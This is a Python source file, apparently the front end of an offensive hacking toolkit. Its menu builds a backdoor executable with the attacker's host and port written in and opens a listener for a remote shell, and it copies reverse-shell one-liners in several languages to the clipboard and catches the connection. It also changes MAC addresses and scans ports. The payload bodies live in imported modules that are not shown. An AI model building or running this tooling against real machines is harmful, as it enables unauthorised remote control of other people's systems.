#!/usr/bin python3
# Import Statements
try:
    from termcolor import colored
    import os
    from Backdoor import backdoor as bd_cli
    from Backdoor import server as bd_ser
    from Backdoor import hasher as bd_has
    import py_compile
    import shutil
    from Revshells.revshells import GenerateRevshell
    import pyperclip
    from Revshells.revshell import RevShell
    from NetworkHacking.mac_changer import change_mac
    from NetworkHacking.port_scanner import PortScan, GetBanner
    import threading
    import readline
    import subprocess
    import PyInstaller.__main__
except Exception as e:
    print(e)
    print("Failed To Import Some Dependencies Exitting.")
    exit(1)

def check_sudo():
    ret = 0
    if os.geteuid() != 0:
        msg = "[sudo] password for %u:"
        ret = subprocess.check_call("sudo -v -p '%s'" % msg, shell=True)    
    return ret

def PortScanner(ip, port):
    if PortScan(ip, port):
        banner = GetBanner(ip, port)
        print(colored(f'\'{port}\' is open Banner: "{banner}"', 'green'))

# Tools
class Tools:
    @staticmethod
    def backdoor(LHOST, LPORT, srcp="."):
        code = []
        with open("Backdoor/backdoor.py", "r") as f:
            code = f.readlines()
            code[0] = f'ip = \'{LHOST}\'\n'
            code[1] = f'port = {LPORT}\n'
        
        try:
            os.mkdir("tmp")
        except:
            pass
        
        with open("tmp/backdoor.py", "w") as f:
            f.writelines(code)
        
        print(srcp)
        py_compile.compile("tmp/backdoor.py")
        PyInstaller.__main__.run([
                "tmp/backdoor.py",
                "--onefile"
            ])

        server = bd_ser.Listener(LHOST, LPORT)
        server.accept_connection()
        server.shell()

    @staticmethod
    def RevShell(language, ip, port):
        language = language.lower()
        pyperclip.copy(GenerateRevshell(ip, port)[language])
        print(colored('[+] The One Liner Has Been Copied.', "magenta"))
        print(colored('[+] Starting The Server!', "magenta"))
        print(colored('[!!] NOTE THAT SINCE IT IS A ONE LINER REVERSE SHELL IT WILL LAG A LOT SO BEWARE!!', 'red'))
        print(colored('[#] We recommend not using clear because it may break the reverse connection', 'blue'))
        RevShell(ip, port) 

    @staticmethod
    def MacChange(new_mac, interface):
        change_mac(new_mac, interface)

    @staticmethod
    def ScanPorts(ip, p_range):
        lower, upper = p_range.split(" ")
        r = int(lower)
        x = int(lower)
        for _ in range(r, int(upper) + 1):
            t = threading.Thread(target=PortScanner, args=(ip, x))
            t.start()
            x += 1

# Prints Logo
def PrintLogo():
    with open("Logo.txt", "r") as f:
        print(colored("\n" + ("-" * 55), "green"))
        print(colored(f.read(), "magenta"))
        print(colored(("-" * 55) + "\n", "blue"))

# Prompts For Options
def GetOptions():
    options = ["Genearate Backdoor", "MAC-Address Changer", "Data Encryptor", "Port Scanners", "One Liner Reverse Shell"]
    options_with_idx = {
        "0": "backdoor",
        "1": "mac-changer",
        "2": "data-encryptor",
        "3": 'port-scanner',
        "4": "rev-shell-one"
    }
    i = 0
    for option in options:
        print(colored(f'{i} > {option}', "yellow"))
        i += 1
    
    selected = input(colored(f"{os.getcwd()}", "blue") + "$ ")
    try:
        return options_with_idx[selected]
    except:
        if selected[:3] == 'cd ':
            os.chdir(selected[3:])
        if selected == 'quit':
            print(colored('[😼] Your friendly neighborhood hackerman signing out ladies!', 'magenta'))
            exit()
        print(colored(f"[!!] Executing {selected} as a system command", "magenta"))
        os.system(selected)

# Handles Selected Option 
def HandleOptions(selected: str):
    if selected == "backdoor":
        LHOST = input(colored("LHOST > ", "magenta"))
        LPORT = int(input(colored("LPORT > ", "magenta")))
        DESTINATION = input(colored("Enter Destination To Save The Backdoor Default is \".\" > ", "magenta"))
        if DESTINATION == "":
            Tools.backdoor(LHOST, LPORT)
        else:
            Tools.backdoor(LHOST, LPORT, srcp=DESTINATION)
    if selected == 'rev-shell-one':
        languages_available = ['Perl', "Ruby", "Python", "Bash", "Netcat", "PHP"]
        i = 0
        print(colored("Languages Avaialable: "))
        for language in languages_available:
            print(f'{i} > {language}')
            i += 1
        
        id = int(input(colored("ID Of Language > ", "green")))
        host = input(colored("Host IP > ", "green"))
        port = int(input(colored("Host Port > ", "green")))
        Tools.RevShell(languages_available[id], host, port)
    if selected == 'mac-changer':
        if check_sudo() != 0:
            print(colored("[*_*] For changing mac adress you gotta be a sudoer!", "red"))
            exit()
        else:
            new_mac = input(colored("New Mac-Address > ", "magenta"))
            interface = input(colored("Which Interface > ", "magenta"))
            Tools.MacChange(new_mac, interface)
        
    if selected == 'port-scanner':
        IP_ADDR = input(colored('IP Address Of The Target > '))
        RANGE = input(colored('Rnage Of Ports To Scan(lower upper) > '))
        Tools.ScanPorts(IP_ADDR, RANGE)

def EnableAutoCompletion(text, state):
    text = text.split(" ")[-1]
    a = []
    for _, folders, files in os.walk("."):
        for folder in folders:
            if folder.startswith(text):
                a.append(folder + "/")
        
        for file in files:
            if file.startswith(text):
                a.append(file)

    return a[state]

if __name__ == '__main__':
    PrintLogo()
    readline.set_completer(EnableAutoCompletion)
    readline.parse_and_bind("tab: complete")

    while True:
        selected = GetOptions()
        HandleOptions(selected)
